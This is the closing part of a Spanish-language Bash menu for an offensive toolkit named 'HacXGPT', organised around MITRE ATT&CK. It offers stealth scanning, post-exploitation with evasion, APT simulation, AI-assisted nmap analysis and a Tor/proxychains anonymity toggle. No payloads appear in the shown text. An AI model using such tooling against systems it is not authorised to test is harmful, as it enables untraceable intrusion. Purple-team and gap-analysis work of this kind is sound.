            echo -e "    ${GREEN}✅ Cubierta${NC}"
            ((cubierto++))
        else
            echo -e "    ${RED}❌ BRECHA — revisa controles${NC}"
        fi
    done

    echo ""
    local pct=0
    (( total > 0 )) && pct=$(( cubierto * 100 / total ))
    echo -e "${CYAN}══ RESULTADO ════════════════════════════════════${NC}"
    echo -e "  Cobertura: ${GREEN}$cubierto${NC} / $total (${YELLOW}$pct%${NC})"
    save_output "[APT_CUSTOM] Cobertura: $cubierto/$total ($pct%)"
}

# ============================================================
# 13. GAP ANALYSIS — HEAT MAP MITRE ATT&CK
# ============================================================
# 13. GAP ANALYSIS — HEAT MAP MITRE ATT&CK (DYNÁMICO)
# ============================================================
analizar_brechas() {
    show_banner
    if check_command "python3" "sudo apt install python3"; then
        python3 "$SCRIPT_DIR/dynamic_gap_analysis.py"
    else
        echo -e "${RED}❌ python3 no está disponible. Instale python3 para ejecutar el Gap Analysis Dinámico.${NC}"
    fi
    echo ""
    read -p "↵ Enter para continuar..." _
}

# ============================================================
# MENÚ PRINCIPAL
# ============================================================
while true; do
    show_banner

    echo -e "${GREEN}🛡️  1. ${NC} Reconocimiento Básico"
    echo -e "${GREEN}🌐  2. ${NC} Escaneo Web"
    echo -e "${GREEN}📡  3. ${NC} Análisis de Red"
    echo -e "${GREEN}⚔️   4. ${NC} Suite de Pentesting"
    echo -e "${GREEN}📊  5. ${NC} Generar Reportes"
    echo -e "${GREEN}🔧  6. ${NC} Herramientas Avanzadas"
    echo -e "${CYAN}💬  7. ${NC} Chat Libre Técnico"
    echo -e "${CYAN}🔍  8. ${NC} Escaneo Sigiloso"
    echo -e "${PURPLE}━━━━━━━━━━━━━━ MODO EXPERTO ━━━━━━━━━━━━━━${NC}"
    echo -e "${YELLOW}🎯  9. ${NC} Matriz MITRE ATT&CK ${CYAN}(14 tácticas)${NC}"
    echo -e "${PURPLE}🟣 10. ${NC} Modo Purple Team ${RED}(Red${NC}+${BLUE}Blue${NC}+${PURPLE}Detect)${NC}"
    echo -e "${RED}💣 11. ${NC} Post-Explotación ${YELLOW}(Win+Linux+Evasión)${NC}"
    echo -e "${CYAN}🕵️  12. ${NC} Simulación de APT ${YELLOW}(APT29·APT38·FIN7)${NC}"
    echo -e "${GREEN}📈 13. ${NC} Gap Analysis ${CYAN}/ Heat Map MITRE${NC}"
    echo -e "${CYAN}📡 14. ${NC} Análisis nmap con IA"
    echo -e "${PURPLE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${CYAN}🎯 Objetivo actual: ${TARGET:-No definido}${NC}"
    echo -e "  ${BLUE}C.${NC}  Cambiar objetivo"
    if [[ "$SAVE_MODE" == true ]]; then
        echo -e "${YELLOW}💾  S. ${NC} Guardar Resultados ${GREEN}[ACTIVO → $OUTPUT_FILE]${NC}"
    else
        echo -e "${YELLOW}💾  S. ${NC} Guardar Resultados ${RED}[INACTIVO]${NC}"
    fi
    if [[ "$ANON_MODE" == true ]]; then
        echo -e "  ${GREEN}🟢  A.${NC}  Modo Anónimo ${GREEN}[ACTIVO — proxychains+Tor]${NC}"
    else
        echo -e "  ${RED}⚫  A.${NC}  Modo Anónimo ${RED}[INACTIVO]${NC}"
    fi
    echo -e "${RED}❌  0. ${NC} Salir"
    echo ""

    read -p "🎯 Selecciona opción [0-14, C, S, A]: " main_opcion

    case $main_opcion in
        1) reconocimiento_basico ;;
        2) escaneo_web ;;
        3) analisis_red ;;
        4) suite_pentesting ;;
        5) generar_reportes ;;
        6) herramientas_avanzadas ;;
        7) chat_libre ;;
        8) escaneo_sigiloso ;;
        9) mitre_menu ;;
        10) modo_purple_team ;;
        11) menu_post_explotacion ;;
        12) simular_apt ;;
        13) analizar_brechas ;;
        14)
            python3 nmap_ai.py
            ;;
        [Cc]) preguntar_objetivo ;;
        [Aa])
            if [[ "$ANON_MODE" == false ]]; then
                if check_command proxychains4 && check_command tor; then
                    if ! systemctl is-active --quiet tor 2>/dev/null; then
                        echo -e "${YELLOW}⚡ Iniciando servicio Tor...${NC}"
                        sudo systemctl start tor 2>/dev/null || service tor start 2>/dev/null
                        sleep 2
                    fi
                    ANON_MODE=true
                    echo ""
                    echo -e "${GREEN}🟢 Modo Anónimo ACTIVADO — tráfico via Tor/proxychains${NC}"
                    echo -e "${YELLOW}⚠️  Verificá con: proxychains curl https://check.torproject.org/api/ip${NC}"
                else
                    echo ""
                    echo -e "${RED}❌ Faltan dependencias. Instalá con:${NC}"
                    echo -e "${YELLOW}   sudo apt install -y tor proxychains4${NC}"
                fi
            else
                ANON_MODE=false
                echo ""
                echo -e "${RED}⚫ Modo Anónimo DESACTIVADO${NC}"
            fi
            sleep 1
            ;;
        [Ss])
            if [[ "$SAVE_MODE" == false ]]; then
                SAVE_MODE=true
                echo ""
                echo -e "${GREEN}✅ Guardado ACTIVADO → ${OUTPUT_FILE}${NC}"
            else
                SAVE_MODE=false
                echo ""
                echo -e "${YELLOW}⏹️  Guardado DESACTIVADO${NC}"
            fi
            sleep 1
            ;;
        0)
            TARGET=""
            show_banner
            echo ""
            echo -e "${GREEN}            ¡HASTA PRONTO! ${NC}"
            echo -e "${BLUE}    Gracias por usar HacXGPT v8.1 EXPERTO ${NC}"
            echo -e "${PURPLE}       MITRE ATT&CK Framework Edition ${NC}"
            echo ""
            echo ""
            exit 0
            ;;
        *)
            echo ""
            echo -e "${RED}❌ Opción no válida${NC}"
            sleep 1
            ;;
    esac
done
